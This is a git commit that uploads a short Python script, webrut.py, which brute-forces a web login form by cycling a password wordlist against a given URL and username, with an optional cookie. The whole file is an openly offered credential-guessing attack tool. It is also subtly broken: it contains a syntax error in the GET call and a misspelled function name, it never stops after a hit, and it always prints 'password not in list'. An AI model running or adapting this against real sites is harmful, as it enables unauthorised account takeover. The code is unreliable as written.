9a23da2a8f810a6d2ba13c96e1544b20df2937ae
neurhost <133167196+neurhost@users.noreply.github.com>
2023-05-20 04:55:22 +0530

    Add files via upload

---
+++ tools/webrut.py
@@ -0,0 +1,31 @@
+import requests
+from termcolor import colored
+
+url = input("enter page url")
+username=input("enter username for the account to brutforce")
+passwordfile=input("enter password file to use")
+loginfail=input("enter string that occurs when login fail")
+cookievalue=input("enter cookie value(optional)")
+
+def cracking(username,url) :
+    for password in passwords:
+        password=password.strip()
+        print(colored(("trying"+password) , "green"))
+        data={"username":username,"password":password,"Login":"submit"}
+        if cookievalue != "":
+            response=requests.get(url,params={"username":username,"password":password,"Login":"Login"} < cookies={"cookie":cookievalue})
+        else:
+            response=requests.post(url,data=data)
+        
+        if loginfail in response.content.decode():
+            pass
+        else:
+            print(colored(("found username"+username) , "blue" ))
+            print(coloured(("found password"+password) , "blue" ))
+
+
+
+with open(passwordfile,"r") as passwords :
+    cracking(username,url)
+
+print("password not in list")
